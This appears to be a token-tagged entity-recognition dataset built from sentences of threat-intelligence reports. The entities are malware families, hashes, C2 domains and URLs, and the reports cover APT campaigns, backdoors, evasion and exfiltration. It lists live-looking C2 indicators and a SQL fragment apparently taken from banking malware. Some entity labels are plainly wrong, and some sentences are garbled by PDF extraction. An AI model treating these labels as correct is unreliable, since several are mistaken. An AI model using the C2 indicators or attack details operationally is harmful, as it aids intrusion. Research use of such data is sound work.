server	O
side	O
code	O
was	O
publicly	O
accessible	O
,	O
allowing	O
us	O
to	O
gain	O
insights	O
into	O
the	O
development	O
and	O
testing	O
phase	O
of	O
an	O
attack	O
using	O
ScanBox	B-malware.infosteal
.	O

Contact	O
Us	O
Communication	O
Preferences	O
Report	O
Security	O
Issue	O
Supplier	O
Documents	O
Legal	O
Documentation	O
Twitter	O
Google+	O
YouTube	O
Podcast	O
LinkedIn	O
Facebook	O
877­FIREEYE	O
(	O
877­347­3393	O
)	O
Glassdoor	O
Copyright	O
©	O
2016	O
FireEye	O
,	O
Inc	O
.	O

Once	O
the	O
malware	O
has	O
sent	O
the	O
information	O
about	O
the	O
host	O
configuration	O
to	O
the	O
C2	O
,	O
it	O
will	O
download	O
another	O
file	O
,	O
'	O
upnphost.exe	O
'	O
,	O
stored	O
in	O
the	O
path	O
'	O
%	O
APPDATA	O
%	O
\Local\Temp	O
'	O
that	O
probably	O
is	O
the	O
final	O
payload	O
.	O

Image	O
of	O
a	O
section	O
of	O
a	O
configuration	O
file	O
for	O
the	O
FinSpy	B-malware.backdoor
Mobile	O
sample	O

may	O
be	O
exploited	O
to	O
allow	O
unauthorized	O
access	O
to	O
sensitive	O
information	O
.	O

After	O
performing	O
this	O
swap	O
operation	O
,	O
DarkComet	B-malware.backdoor
finally	O
decrypts	O
a	O
byte	O
of	O
message	O
.	O

Typically	O
,	O
such	O
threats	O
take	O
an	O
alarmingly	O
long	O
time	O
to	O
detect	O
and	O
eliminate	O
,	O
often	O
more	O
than	O
a	O
year	O
.	O

7	O
당시	O
해당	O
ERP	O
솔루션을	O
사용하는	O
모든	O
업체가	O
아니라	O
특정한	O
공격	O
대상	O
인	O
기업에만	O
악성코드가	O
다운로드되었다	O
.	O

This	O
C2	B-malware.backdoor
scheme	O
would	O
seem	O
to	O
dictate	O
:	O
Intruder	O
remote	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
Intruder	O
local	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
a	O
C2	B-malware.backdoor
delivery/retrieval	O
component	O
,	O
such	O
as	O
another	O
piece	O
of	O
code	O
that	O
downloads	O
a	O
C2	B-malware.backdoor
file	O
Available	O
information	O
precludes	O
determination	O
of	O
the	O
means	O
of	O
exfiltration	O
.	O

Service	O
names	O
also	O
can	O
differ	O
from	O
version	O
to	O
version	O
;	O
we	O
discovered	O
the	O
following	O
names	O
--	O
DriverManage	O
,	O
WebService	O
and	O
WebClientManager	O
.	O

cortana-scripts	O
metasploit-loader	O
malleable-c2-profiles	O
layer2-privoting-client	O
armitage	O

On	O
top	O
of	O
this	O
,	O
they	O
ignored	O
Android	O
's	O
warnings	O
about	O
downloading	O
apps	O
from	O
unknown	O
sources	O
.	O

The	O
server	O
also	O
hosts	O
a	O
copy	O
of	O
the	O
obfuscated	O
PowerShell	O
implant	O
.	O

IDS	O
signatures	O
similar	O
to	O
the	O
one	O
illustrated	O
in	O
the	O
Detect	O
section	O
should	O
be	O
used	O
to	O
detect	O
inbound	O
exploit	O
attempts	O
,	O
and	O
machines	O
accepting	O
this	O
data	O
should	O
be	O
scanned	O
for	O
potential	O
infections	O
.	O

Date	O
first	O
seen	O
Primary	O
C	O
&	O
C	O

We	O
can	O
speculate	O
that	O
we	O
have	O
two	O
different	O
samples	O
,	O
then	O
we	O
were	O
able	O
to	O
extract	O
2	O
files	O
from	O
the	O
second	O
family	O
:	O
a	O
classic	O
'	O
.lnk	O
'	O
file	O
and	O
a	O
'	O
jpg	O
'	O
file	O
.	O

After	O
the	O
four	O
byte	O
integer	O
that	O
represents	O
the	O
size	O
,	O
the	O
fi	O
rst	O
byte	O
of	O
the	O
packet	O
payload	O
contains	O
an	O
operation	O
code	O
.	O

Currently	O
,	O
the	O
IRGC	O
is	O
Iran	O
's	O
premier	O
security	O
organization	O
and	O
possesses	O
an	O
army	O
,	O
navy	O
,	O
and	O
air	O
force	O
,	O
and	O
manages	O
'	O
Iran	O
's	O
ballistic	O
missile	O
arsenal	O
and	O
irregular	O
warfare	O
operations	O
through	O
its	O
elite	O
Quds	O
Force	O
and	O
proxies	O
such	O
as	O
Hezbollah	O
.	O
'	O

On	O
many	O
occasions	O
,	O
both	O
the	O
dropper	O
and	O
the	O
payload	O
will	O
contain	O
a	O
range	O
of	O
techniques	O
to	O
ensure	O
the	O
sample	O
is	O
not	O
being	O
analyzed	O
on	O
a	O
virtual	O
machine	O
,	O
using	O
a	O
debugger	O
,	O
or	O
located	O
within	O
a	O
sandbox	O
.	O

FireEye	O
has	O
not	O
connected	O
this	O
activity	O
to	O
any	O
actor	O
we	O
currently	O
track	O
;	O
however	O
,	O
we	O
assess	O
with	O
moderate	O
confidence	O
that	O
the	O
actor	O
is	O
sponsored	O
by	O
a	O
nation	O
state	O
.	O

This	O
functionality	O
allows	O
the	O
attackers	O
to	O
delete	O
their	O
footprints	O
on	O
the	O
system	O
.	O

Our	O
firm	O
of	O
cybersecurity	O
experts	O
,	O
staffed	O
by	O
veterans	O
from	O
the	O
United	O
States	O
Department	O
of	O
Defense	O
,	O
identified	O
suspicious	O
activity	O
within	O
one	O
of	O
our	O
client	O
's	O
networks	O
;	O
a	O
threat	O
which	O
on	O
closer	O
inspection	O
bore	O
the	O
unique	O
signature	O
of	O
a	O
group	O
of	O
Russian	O
hackers	O
well-known	O
in	O
the	O
cyber-security	O
industry	O
.	O

Generic	O
buffer	O
overflow	O
protection	O
is	O
expected	O
to	O
cover	O
some	O
,	O
but	O
not	O
all	O
,	O
exploits	O
.	O

The	O
Base64-encoded	O
parameters	O
z1	O
and	O
z2	O
are	O
highlighted	O
in	O
the	O
following	O
output	O
:	O

NATO	O
,	O
Afghan	O
Ministry	O
of	O
Foreign	O
Affairs	O
,	O
Pakistani	O
Military	O
JULY	O
2015	O
APT28	B-malware.infosteal
used	O
two	O
domains	O
(	O
nato-news.com	B-url.unknown
and	O
bbc-news.org	B-url.unknown
)	O
to	O
host	O
an	O
Adobe	O
Flash	O
zero-day	O
exploit	O
to	O
target	O
NATO	O
,	O
the	O
Afghan	O
Ministry	O
of	O
Foreign	O
Affairs	O
,	O
and	O
the	O
Pakistani	O
military	O
.	O

Here	O
is	O
a	O
table	O
with	O
the	O
minimal	O
information	O
about	O
46	O
different	O
samples	O
:	O

Below	O
screen	O
shots	O
show	O
the	O
code	O
that	O
is	O
performing	O
the	O
C2	O
connection	O
and	O
the	O
validation	O
.	O

Additional	O
thanks	O
to	O
Bill	O
Marczak	O
,	O
Byron	O
Sonne	O
,	O
Adam	O
Senft	O
,	O
and	O
Ron	O
Deibert	O
.	O

Over	O
the	O
last	O
several	O
months	O
,	O
we	O
have	O
encountered	O
a	O
large	O
number	O
of	O
DarkComet	B-malware.backdoor
samples	O
,	O
numbering	O
well	O
over	O
a	O
thousand	O
.	O

f	O
:	O
\F\Windows	O
Work\G1\Adeel	O
's	O
Laptop\G1	O
Main	O
Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdb	O

The	O
second	O
resource	O
,	O
0x000B	O
,	O
contains	O
as	O
its	O
payload	O
an	O
XML	O
file	O
with	O
instructions	O
for	O
the	O
dropper	O
on	O
where	O
to	O
install	O
the	O
dropped	O
components	O
and	O
what	O
to	O
name	O
them	O
.	O

안다리엘	O
그룹의	O
공격	O
사례에서	O
확인한	O
것처럼	O
기업	O
및	O
기관의	O
중앙관리	O
솔루션	O
또한	O
언제든	O
공격의	O
경로	O
가될수	O
있다	O
.	O

Similarly	O
,	O
WATERSPOUT	B-malware.backdoor
is	O
a	O
newly	O
discovered	O
backdoor	O
and	O
the	O
threat	O
actors	O
behind	O
the	O
campaign	O
have	O
not	O
been	O
positively	O
identified	O
.	O

c.	O
Update	O
download	O
counter	O
:	O
Runs	O
a	O
counter	O
script	O
by	O
opening	O
http://myadmin2012.com/tong.htm	B-url.unknown
.	O

C	O
:	O
WindowsSystem32	O
directory	O
:	O

In	O
terms	O
of	O
architecture	O
,	O
the	O
platform	O
used	O
to	O
create	O
Duqu	B-malware.infosteal
and	O
Stuxnet	B-malware.backdoor
is	O
the	O
same	O
.	O

Finally	O
,	O
this	O
geo-location	O
supports	O
the	O
likely	O
theory	O
that	O
the	O
attackers	O
behind	O
Kimsuky	B-malware.drop
are	O
based	O
in	O
North	O
Korea	O
.	O

97576FA7A236679DBE3ABE1A4E852026	B-hash
mjed10.no-ip.info	B-url.cncsvr

Code	O
in	O
their	O
custom	O
malware	O
bore	O
similarities	O
,	O
for	O
instance	O
.	O

Following	O
on	O
from	O
our	O
previous	O
post	O
on	O
ScanBox	B-malware.infosteal
,	O
we	O
have	O
watched	O
the	O
clusters	O
of	O
activity	O
outlined	O
with	O
close	O
interest	O
,	O
as	O
well	O
as	O
keeping	O
an	O
eye	O
on	O
new	O
adopters	O
of	O
the	O
ScanBox	B-malware.infosteal
framework	O
.	O

MARCH	O
–	O
NOVEMBER	O
2016	O

Much	O
like	O
Darwin	O
's	O
theory	O
of	O
biological	O
evolution	O
,	O
APT12	O
been	O
forced	O
to	O
evolve	O
and	O
adapt	O
in	O
order	O
to	O
maintain	O
its	O
mission	O
.	O

Appendix	O
A	O
:	O
Snort	O
rules	O
11	O
.	O

We	O
observe	O
the	O
'	O
retranslator	O
'	O
code	O
,	O
or	O
ProcessRetranslator.dll	O
,	O
currently	O
being	O
delivered	O
to	O
systems	O
without	O
the	O
presence	O
of	O
the	O
previous	O
,	O
large	O
,	O
SPLM	B-malware.backdoor
code	O
and	O
injection	O
capabilities	O
.	O

This	O
creates	O
basic	O
blocks	O
with	O
no	O
parents	O
.	O

Hence	O
there	O
are	O
very	O
few	O
noticeable	O
traces	O
of	O
ramFS	O
during	O
its	O
use	O
.	O

One	O
sample	O
we	O
dug	O
from	O
the	O
malware	O
zoo	O
has	O
also	O
been	O
spotted	O
in	O
various	O
regions	O
in	O
Asia	O
.	O

Non-profit	O
organization	O
Sale	O
of	O
drugs	O
T	O
ravel/maps	O
Resources	O
based	O
on	O
the	O
Bump	O
platform	O
(	O
platform	O
for	O
corporate	O
social	O
networks	O
)	O
–	O
non-profit	O
organization	O
,	O
social	O
network	O
for	O
college/university	O
alumni	O
,	O
communication	O
platform	O
for	O
NGOs	O
,	O
etc	O
.	O

As	O
a	O
result	O
of	O
replacing	O
the	O
original	O
sshd	O
file	O
with	O
a	O
modified	O
one	O
on	O
the	O
infected	O
server	O
,	O
an	O
attacker	O
can	O
use	O
a	O
'	O
master	O
password	O
'	O
to	O
get	O
authorized	O
on	O
the	O
remote	O
server	O
,	O
while	O
leaving	O
minimal	O
traces	O
(	O
compared	O
to	O
an	O
ordinary	O
user	O
connecting	O
via	O
ssh	O
)	O
.	O

The	O
campaign	O
has	O
a	O
high	O
chance	O
of	O
success	O
against	O
victims	O
who	O
have	O
an	O
unpatched	O
version	O
of	O
Flash	O
.	O

They	O
scout	O
for	O
vulnerable	O
practices	O
,	O
susceptible	O
systems	O
and	O
operational	O
loopholes	O
that	O
they	O
can	O
leverage	O
or	O
abuse	O
.	O

The	O
problem	O
relies	O
on	O
the	O
fact	O
that	O
the	O
'	O
.key	O
'	O
and	O
'	O
.value	O
'	O
members	O
are	O
used	O
as	O
indexes	O
without	O
any	O
kind	O
of	O
boundary	O
checks	O
.	O

Figure	O
10	O
:	O
decode_string	O
routine	O

search/	O
?	O
,	O
find/	O
?	O
,	O
results/	O
?	O
,	O
open/	O
?	O
,	O
search/	O
?	O
,	O
close/	O
?	O

Here	O
are	O
the	O
main	O
characteristics	O
that	O
can	O
help	O
profile	O
the	O
threat	O
actor	O
:	O

Over	O
the	O
course	O
of	O
a	O
little	O
over	O
a	O
week	O
,	O
malware	O
delivered	O
from	O
winrar.it	B-url.normal
appeared	O
on	O
over	O
600	O
systems	O
throughout	O
Europe	O
and	O
Northern	O
Africa/Middle	O
East	O
.	O

If	O
unlabeled	O
textbox1	O
is	O
a	O
local	O
file	O
on	O
infected	O
system	O
,	O
the	O
file	O
is	O
read	O
and	O
displayed	O
to	O
attacker	O
.	O

At	O
this	O
point	O
,	O
the	O
startup	O
sequence	O
for	O
Derusbi	B-malware.backdoor
is	O
complete	O
and	O
the	O
server	O
variant	O
moves	O
into	O
a	O
communication	O
and	O
command	O
dispatch	O
phase	O
.	O

To	O
illustrate	O
the	O
complexity	O
of	O
these	O
lures	O
,	O
Figure	O
4	O
shows	O
the	O
creation	O
of	O
persistence	O
mechanisms	O
for	O
recovered	O
APT32	B-malware.infosteal
lure	O
'	O
2017	O
.doc	O
'	O
.	O

'	O
Pelosi	O
,	O
Nancy	O
.	O

However	O
,	O
the	O
configuration	O
was	O
still	O
stored	O
embedded	O
in	O
the	O
binary	O
.	O

Umbrella	O
,	O
our	O
secure	O
internet	O
gateway	O
(	O
SIG	O
)	O
,	O
blocks	O
users	O
from	O
connecting	O
to	O
malicious	O
domains	O
,	O
IPs	O
,	O
and	O
URLs	O
,	O
whether	O
users	O
are	O
on	O
or	O
off	O
the	O
corporate	O
network	O
.	O

If	O
you	O
compare	O
the	O
HTTP	O
GET	O
request	O
from	O
the	O
RIPTIDE	B-malware.backdoor
samples	O
(	O
Figure	O
1	O
)	O
to	O
the	O
HTTP	O
GET	O
request	O
from	O
the	O
HIGHTIDE	B-malware.backdoor
samples	O
(	O
Figure	O
3	O
)	O
you	O
can	O
see	O
the	O
malware	O
author	O
changed	O
the	O
following	O
items	O
:	O
User	O
Agent	O
Format	O
and	O
structure	O
of	O
the	O
HTTP	O
Uniform	O
Resource	O
Identifier	O
(	O
URI	O
)	O

Fake	O
DLL	O
:	O
goopdate.dll	O
(	O
973b1ca8661be6651114edf29b10b31db4e218f7	B-hash
)	O

Screen	O
Grabbing	O
and	O
Keylogging	O

Then	O
something	O
happens	O
that	O
throws	O
this	O
picture	O
in	O
disarray	O
.	O

T	O
able	O
1.Co	O
m	O
pr	O
o	O
m	O
ise	O
d	O
se	O
r	O
ve	O
rsT	O
able	O
1.Co	O
m	O
pr	O
o	O
m	O
ise	O
d	O
se	O
r	O
ve	O
r	O
s	O
Co	O
unt	O
r	O
y	O
Co	O
unt	O
r	O
y	O
De	O
scr	O
ipt	O
io	O
n	O
De	O
scr	O
ipt	O
io	O
n	O
Ro	O
le	O
in	O
t	O
he	O
at	O
t	O
ack	O
Ro	O
le	O
in	O
t	O
he	O
at	O
t	O
ack	O

'	O
HT	O
Srl	O
'	O
Certificate	O
Details	O
:	O
Status	O
:	O
Revoked	O

iDefense	O
analysts	O
have	O
identified	O
a	O
campaign	O
likely	O
to	O
be	O
targeting	O
members	O
of	O
or	O
those	O
with	O
affiliation	O
or	O
interest	O
in	O
the	O
ASEAN	O
Defence	O
Minister	O
's	O
Meeting	O
(	O
ADMM	O
)	O
.	O

The	O
logged	O
keystrokes	O
are	O
then	O
sent	O
back	O
to	O
the	O
C	O
&	O
C	O
and	O
saved	O
to	O
.	O

Ransomware	O
101	O
This	O
infographic	O
shows	O
how	O
ransomware	O
has	O
evolved	O
,	O
how	O
big	O
the	O
problem	O
has	O
become	O
,	O
and	O
ways	O
to	O
avoid	O
being	O
a	O
ransomware	O
victim	O
.	O

A	O
few	O
days	O
after	O
,	O
the	O
operator	O
stopped	O
answering	O
in	O
the	O
chat	O
room	O
,	O
and	O
her	O
user	O
account	O
was	O
deleted	O
from	O
the	O
server	O
.	O

Fake	O
feedreader	O
SHA256	O
:	O

T	O
he	O
diagram	O
below	O
shows	O
times	O
of	O
illegitimate	O
logons	O
to	O
one	O
of	O
the	O
compromised	O
servers	O
during	O
one	O
month	O
.	O

The	O
mapped	O
object	O
contains	O
name	O
and	O
path	O
to	O
the	O
malicious	O
DLL	O
,	O
the	O
name	O
of	O
the	O
pipe	O
being	O
used	O
for	O
communication	O
between	O
the	O
instances	O
,	O
the	O
name	O
of	O
the	O
export	O
from	O
the	O
DLL	O
to	O
be	O
called	O
as	O
well	O
as	O
information	O
about	O
instances	O
already	O
running	O
.	O

The	O
list	O
of	O
keywords	O
,	O
in	O
base64	O
format	O
,	O
is	O
retrieved	O
from	O
the	O
command	O
and	O
control	O
server	O
as	O
a	O
text	O
file	O
.	O

After	O
this	O
initial	O
activity	O
,	O
the	O
attackers	O
usually	O
downloaded	O
more	O
of	O
their	O
tools	O
to	O
the	O
computer	O
using	O
a	O
PowerShell	O
downloader	O
and	O
began	O
moving	O
across	O
the	O
victim	O
's	O
network	O
.	O

As	O
soon	O
as	O
smtXX.tmp	O
is	O
finished	O
being	O
written	O
to	O
disk	O
,	O
a	O
file	O
(	O
1431XXXXXXXX.dat	O
)	O
is	O
written	O
,	O
roughly	O
the	O
same	O
size	O
as	O
smtXX.tmp	O
.	O

2015년부터	O
2017년	O
사이에	O
발견된	O
변형은	O
서버	O
IP	O
,	O
타깃	O
시스템	O
IP	O
,	O
다운로드	O
주소	O
,	O
원격	O
실행	O
파일	O
경로	O
등을	O
인자로	O
받아	O
취약점	O
공격에	O
성공한	O
시스템	O
상에서	O
악성코드를	O
다운로드하는	O
스크립트	O
파일을	O
생성	O
한다	O
.	O

Kaspersky	O
Lab	O
products	O
detect	O
the	O
different	O
artifacts	O
used	O
in	O
this	O
campaign	O
with	O
the	O
following	O
verdicts	O
:	O
T	O
rojan.Win32.Generic	O
,	O
T	O
rojan-Downloader.Win32.Upatre	O
and	O
Backdoor.Win32.HyperBro	O
.	O

Adding	O
in	O
their	O
creative	O
waterholing	B-malware.backdoor
and	O
poisoned	O
installer	O
tactics	O
,	O
we	O
describe	O
the	O
StrongPity	O
APT	O
as	O
not	O
only	O
determined	O
and	O
well-resourced	O
,	O
but	O
fairly	O
reckless	O
and	O
innovative	O
as	O
well	O
.	O

It	O
's	O
important	O
to	O
note	O
that	O
,	O
attack	O
capabilities	O
can	O
be	O
widely	O
distributed	O
if	O
attackers	O
take	O
full	O
advantages	O
of	O
certain	O
technology	O
,	O
especially	O
computer	O
technology	O
can	O
make	O
attack	O
more	O
powerful	O
and	O
automated	O
.	O
'	O

ZKM	O
obfuscates	O
the	O
code	O
by	O
giving	O
it	O
generic	O
class	O
,	O
method	O
,	O
and	O
variable	O
names	O
,	O
it	O
also	O
encodes	O
the	O
strings	O
by	O
xoring	O
them	O
with	O
a	O
series	O
of	O
random	O
bytes	O
,	O
and	O
includes	O
extraneous	O
code-paths	O
.	O

.مداقلا	O
نيطسلف	O
ةلود	O
سيئر	O
)	O
نلاحد	O
دمحم	O
(	O
تاريدقتو	O
ليلحت	O

It	O
's	O
an	O
attempt	O
to	O
muddy	O
the	O
waters	O
for	O
the	O
analysts/researchers	O
to	O
direct	O
blame	O
elsewhere	O
.	O

During	O
initialization	O
Babar	B-malware.drop
loads	O
and	O
decrypts	O
a	O
set	O
of	O
configuration	O
parameters	O
which	O
are	O
appended	O
to	O
the	O
DLL	O
's	O
relocation	O
section	O
.	O

Di	O
Amato	O
alleges	O
that	O
his	O
law	O
firm	O
's	O
website	O
has	O
been	O
the	O
victim	O
of	O
several	O
DDoS	O
attacks	O
,	O
which	O
he	O
believes	O
are	O
linked	O
to	O
his	O
litigation	O
involving	O
the	O
government	O
of	O
Kazakhstan	O
.	O

The	O
following	O
paper	O
is	O
a	O
technical	O
analysis	O
on	O
the	O
functionality	O
of	O
ZxShell	B-malware.backdoor
.	O

[	O
Israeli	O
MFA	O
]	O
questionnaire	O
-	O
URGENT	O
–	O
An	O
original	O
paper	O
,	O
probably	O
stolen	O
in	O
previous	O
attacks	O
.	O

Unfortunately	O
for	O
xtremecoder	O
,	O
the	O
source	O
code	O
has	O
been	O
leaked	O
online	O
.	O

?	O
\Parameters\	O

The	O
implementation	O
is	O
quite	O
simple	O
:	O
After	O
the	O
handshake	O
,	O
2	O
threads	O
that	O
deal	O
with	O
data	O
transfer	O
are	O
spawned	O
.	O

As	O
the	O
latest	O
revision	O
of	O
the	O
backdoor	O
,	O
portions	O
of	O
SPLM	B-malware.backdoor
did	O
n't	O
match	O
previous	O
reports	O
on	O
SPLM/XAgent	B-malware.backdoor
while	O
other	O
similarities	O
were	O
maintained	O
.	O

Malicious	O
Domain	O
/	O
IP	O
:	O
blog.versign(.)info	B-url.cncsvr

The	O
main	O
PowerShell	O
file	O
invoker.ps1	O
uses	O
these	O
components	O
to	O
run	O
the	O
final	O
payload	O
,	O
PRB-Backdoor	B-malware.backdoor
,	O
previously	O
analyzed	O
by	O
other	O
security	O
researchers	O
in	O
May	O
2018	O
.	O

An	O
analysis	O
of	O
this	O
arsenal	O
shows	O
that	O
the	O
attackers	O
went	O
out	O
of	O
their	O
way	O
to	O
restore	O
the	O
PowerShell-based	O
infrastructure	O
,	O
even	O
though	O
it	O
had	O
already	O
been	O
detected	O
and	O
shut	O
down	O
once	O
.	O

Figure	O
28	O
.	O

These	O
commands	O
are	O
briefly	O
described	O
in	O
Table	O
2	O
(	O
overleaf	O
)	O
.	O

This	O
may	O
be	O
used	O
to	O
load	O
additional	O
downloaded	O
components	O
of	O
the	O
attack	O
.	O

The	O
reply	O
from	O
the	O
active	O
command	O
and	O
control	O
server	O
can	O
be	O
seen	O
in	O
Figure	O
6	O
:	O

When	O
applied	O
to	O
the	O
hex	O
data	O
following	O
it	O
,	O
we	O
get	O
the	O
decrypted	O
data	O
below	O
,	O
which	O
contains	O
the	O
MAC	O
Address	O
,	O
hostname	O
,	O
and	O
campaign	O
code	O
.	O

Babar	B-malware.drop
is	O
a	O
fully	O
blown	O
espionage	O
tool	O
,	O
built	O
to	O
excessively	O
spy	O
on	O
the	O
user	O
's	O
activity	O
on	O
an	O
infected	O
machine	O
.	O

vulnerabilities	O
,	O
sophisticated	O
During	O
the	O
end	O
of	O
April	O
2015	O
,	O
root9B	O
analysts	O
were	O
conducting	O
routine	O
security	O
analysis	O
to	O
explore	O
and	O
discover	O
new	O
and	O
emerging	O
cyber	O
threats	O
.	O

The	O
Svchost	O
group	O
registry	O
key	O
HKLM\SOFTWARE\Microsoft\Windows	O
NT\CurrentVersion\SvcHost	O
is	O
opened	O
and	O
the	O
netsvc	O
group	O
value	O
data	O
is	O
queried	O
to	O
generate	O
a	O
name	O
for	O
the	O
service	O
.	O

The	O
choice	O
of	O
the	O
Russian	O
language	O
character	O
set	O
in	O
the	O
application	O
further	O
underscores	O
the	O
targeting	O
of	O
forces	O
within	O
eastern	O
Ukraine	O
,	O
as	O
Russian	O
is	O
the	O
predominant	O
language	O
utilized	O
in	O
that	O
region	O
.	O

Given	O
how	O
cybercriminal	O
tools	O
,	O
tactics	O
and	O
procedures	O
are	O
evolving	O
,	O
organizations	O
will	O
have	O
to	O
go	O
beyond	O
their	O
typical	O
day-to-day	O
security	O
requirements	O
and	O
find	O
a	O
way	O
to	O
preempt	O
attacks	O
.	O

국회의원실	O
사칭한	O
메일이	O
다운로드하는	O
악성코드는	O
2017년	O
ATM	O
해킹에	O
사용된	O
악성코드의	O
변형으로	O
,	O
또	O
다른	O
변형이	O
6월	O
금융권	O
공격에도	O
사용되었다	O
.	O

This	O
continues	O
to	O
suggest	O
that	O
intruders	O
either	O
have	O
local	O
or	O
remote	O
access	B-malware.backdoor
to	I-malware.backdoor
headquarters	I-malware.backdoor
systems	I-malware.backdoor
running	O
netsat.exe	O
or	O
access	O
to	O
another	O
application	O
that	O
automates	O
remote	O
C2	O
data/file	O
retrieval	O
.	O

These	O
solutions	O
are	O
powered	O
by	O
the	O
Trend	O
Micro	O
XGenTM	O
security	O
,	O
which	O
provides	O
a	O
cross-generational	O
blend	O
of	O
threat	O
defense	O
techniques	O
against	O
a	O
full	O
range	O
of	O
threats	O
for	O
data	O
centers	O
,	O
cloud	O
environments	O
,	O
networks	O
,	O
and	O
endpoints	O
.	O

Targeting	O
in	O
arabic	O

However	O
,	O
it	O
looks	O
convincing	O
enough	O
to	O
pass	O
cursory	O
inspection	O
,	O
i.e.	O
,	O
the	O
format	O
appears	O
legitimate	O
and	O
the	O
appearance	O
does	O
not	O
engender	O
suspicion	O
.	O

이는	O
실행	O
파일이	O
다운로드	O
될	O
때	O
행위	O
기반	O
보안	O
솔루션에	O
의해	O
탐지되는	O
것을	O
피하기	O
위한	O
목적으로	O
보인다	O
.	O

In	O
this	O
blog	O
we	O
describe	O
a	O
sophisticated	O
backdoor	O
,	O
called	O
Dino	B-malware.backdoor
by	O
its	O
creators	O
.	O

The	O
original	O
filename	O
of	O
the	O
sample	O
was	O
resume.exe	O
.	O

These	O
attacks	O
have	O
been	O
ongoing	O
for	O
at	O
least	O
a	O
year	O
;	O
seemingly	O
first	O
focused	O
on	O
Palestinians	O
,	O
then	O
Israelis	O
.	O

Web	O
based	O
RAT	B-malware.unknown
control	O
panels	O
found	O
on	O
Operation	B-malware.ransom
Manul	I-malware.ransom
C2	O
Servers	O
Fig	O
12	O
.	O

We	O
must	O
consider	O
that	O
these	O
domains	O
could	O
have	O
been	O
used	O
by	O
other	O
actors	O
over	O
this	O
time	O
period	O
.	O

showBackupIosFolder	O

Perhaps	O
the	O
most	O
interesting	O
aspect	O
of	O
the	O
Snake	O
Wine	O
group	O
is	O
the	O
number	O
of	O
techniques	O
used	O
to	O
obscure	O
attribution	O
.	O

The	O
RAT	O
is	O
available	O
for	O
free	O
;	O
however	O
,	O
the	O
developer	O
charges	O
350	O
Euros	O
for	O
the	O
source	O
code	O
.	O

The	O
capability	O
of	O
the	O
malware	O
includes	O
gaining	O
access	O
to	O
contacts	O
,	O
Short	O
Message	O
Service	O
(	O
SMS	O
)	O
text	O
messages	O
,	O
call	O
logs	O
,	O
and	O
internet	O
data	O
,	O
and	O
FANCY	O
BEAR	O
would	O
likely	O
leverage	O
this	O
information	O
for	O
its	O
intelligence	O
and	O
planning	O
value	O
.	O

Sofacy	O
attackers	O
had	O
recorded	O
a	O
previous	O
Grey	O
Lambert	O
remote	O
session	O
and	O
replayed	O
the	O
communication	O
after	O
discovering	O
this	O
host	O
,	O
essentially	O
compromising	O
the	O
Grey	O
Lambert	O
module	O
on	O
the	O
system	O
to	O
gain	O
access	O
and	O
later	O
injecting	O
SPLM	B-malware.backdoor
modules	O
2	O
.	O

dwTotalPacketSize	O
field	O
defines	O
the	O
total	O
size	O
of	O
the	O
datagram	O
including	O
both	O
the	O
size	O
of	O
the	O
header	O
and	O
the	O
size	O
of	O
the	O
optional	O
payload	O
.	O

ADEX는	O
1996년부터	O
격년으로	O
진행되는	O
국제	O
방위산업	O
전시회이다	O
.	O

Indicates	O
error	O
copying	O
netwi.drv	O
to	O
~disk.ini	O
.	O

According	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
Tajik	O
's	O
father	O
maintained	O
a	O
strong	O
religious	O
background	O
and	O
was	O
a	O
veteran	O
of	O
Iran	O
's	O
ministry	O
of	O
intelligence	O
.	O

Crash101.dll	O
Crash	O

The	O
following	O
diagram	O
shows	O
the	O
links	O
in	O
tools	O
and	O
targets	O
between	O
the	O
groups	O
discussed	O
in	O
our	O
previous	O
blog	O
,	O
but	O
newer	O
information	O
has	O
since	O
come	O
to	O
light	O
which	O
allows	O
us	O
to	O
more	O
accurately	O
associate	O
these	O
groups	O
with	O
known	O
threat	O
actors	O
:	O
Between	O
these	O
clusters	O
,	O
we	O
've	O
seen	O
strategic	O
web	O
compromises	O
designed	O
to	O
target	O
users	O
in	O
the	O
following	O
countries	O
:	O

These	O
individuals	O
have	O
been	O
grouped	O
within	O
PalantirTM	O
as	O
'	O
technical	O
support	O
for	O
bot	O
'	O
at	O
location	O
5	O
.	O

The	O
will	O
attempt	O
to	O
open	O
a	O
handle	O
to	O
the	O
driver	O
(	O
if	O
it	O
is	O
already	O
installed	O
)	O
by	O
calling	O
CreateFile	O
with	O
the	O
filename	O
of	O
\Device\	O
{	O
93144EB0-8E3E-4591-B307-8EEBFE7DB28F	O
}	O
.	O

Appendix	B-hash
A	O
Indicators	O
of	O
Compromise	O

Development	O
and	O
Distribution	O
CrowdStrike	O
has	O
discovered	O
indications	O
that	O
as	O
early	O
as	O
2015	O
FANCY	O
BEAR	O
likely	O
developed	O
X-Agent	B-malware.infosteal
applications	O
for	O
the	O
iOS	O
environment	O
,	O
targeting	O
'	O
jailbroken	O
'	O
Apple	O
mobile	O
devices	O
.	O

A	O
vast	O
array	O
of	O
components	O
was	O
implemented	O
in	O
the	O
malware	O
including	O
four	O
0-Day	O
exploits	O
,	O
a	O
windows	O
rootkit	O
,	O
antivirus	O
evasion	O
techniques	O
,	O
complex	O
process	O
injection	O
and	O
hooking	O
code	O
,	O
network	O
infection	O
routines	O
,	O
peer-to-peer	O
updates	O
,	O
a	O
command	O
and	O
control	O
interface	O
,	O
as	O
well	O
as	O
the	O
first	O
ever	O
PLC	O
rootkit	O
.	O

When	O
the	O
victim	O
opens	O
the	O
attached	O
excel	O
file	O
it	O
prompts	O
the	O
user	O
to	O
enable	O
macro	O
content	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
threat	O
actors	O
used	O
a	O
set	O
of	O
methods	O
to	O
hide	O
and	O
operate	O
their	O
malwares	O
.	O

The	O
URL	O
used	O
by	O
Cmstar	B-malware.unknown
to	O
communicate	O
with	O
its	O
C2	O
server	O
,	O
as	O
well	O
as	O
significant	O
infrastructure	O
overlap	O
,	O
show	O
a	O
direct	O
relationship	O
between	O
the	O
Cmstar	B-malware.unknown
downloader	O
,	O
Lurid/Enfal	B-malware.unknown
and	O
Cmwhite	B-malware.unknown
tools	O
.	O

This	O
simple	O
encoding	O
takes	O
the	O
most	O
significant	O
nibble	O
for	O
each	O
character	O
,	O
swaps	O
the	O
nibbles	O
of	O
that	O
byte	O
,	O
and	O
xors	O
the	O
result	O
against	O
the	O
original	O
value	O
.	O

SELECT	O
MESG_S_UMID	O
FROM	O
SAAOWNER.MESG_%s	O
WHERE	O
